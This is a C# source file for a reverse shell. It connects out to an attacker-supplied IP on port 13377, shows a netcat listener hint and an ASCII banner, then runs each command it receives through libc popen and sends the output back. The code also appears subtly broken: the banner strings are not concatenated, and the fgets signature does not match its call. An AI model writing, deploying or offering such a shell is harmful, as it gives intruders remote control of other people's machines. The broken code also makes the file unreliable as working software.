using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

class Program {
    [DllImport("libc")]
    private static extern IntPtr popen(string command, string type);

    [DllImport("libc")]
    private static extern int pclose(IntPtr stream);

    [DllImport("libc")]
    private static extern IntPtr fgets(StringBuilder str, int size, IntPtr stream);

    static void Main(string[] args) {
        string we = "  _____            _      _____          _      \n"
                  " |  __ \\          | |    / ____|        | |     \n"
                  " | |__) |___  __ _| |___| |     ___   __| | ___ \n"
                  " |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\ \n"
                  " | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/ \n"
                  " |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___| \n";

        int po = 13377; // nc -l -p 13377

        if (args.Length < 2) {
            Console.WriteLine("Please provide the IP address as a command-line argument.");
            return;
        }

        string ip = args[1];
        byte[] buffer = new byte[1024];
        TcpClient client = new TcpClient();

        client.Connect(ip, po);
        NetworkStream stream = client.GetStream();

        byte[] weBytes = Encoding.ASCII.GetBytes(we);
        stream.Write(weBytes, 0, weBytes.Length);

        while (true) {
            byte[] prompt = Encoding.ASCII.GetBytes("\n$ ");
            stream.Write(prompt, 0, prompt.Length);

            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);

            if (command.Trim() == "exit") {
                stream.Close();
                client.Close();
                return;
            }

            IntPtr ptr = popen(command, "r");
            if (ptr == IntPtr.Zero) {
                Console.WriteLine("Command execution error");
                return;
            }

            StringBuilder outputBuilder = new StringBuilder();
            IntPtr outputPtr = Marshal.AllocHGlobal(1024);

            while (fgets(outputPtr, 1024, ptr) != IntPtr.Zero) {
                outputBuilder.Append(Marshal.PtrToStringAnsi(outputPtr));
            }

            pclose(ptr);
            Marshal.FreeHGlobal(outputPtr);

            byte[] outputBytes = Encoding.ASCII.GetBytes(outputBuilder.ToString());
            stream.Write(outputBytes, 0, outputBytes.Length);
        }
    }
}
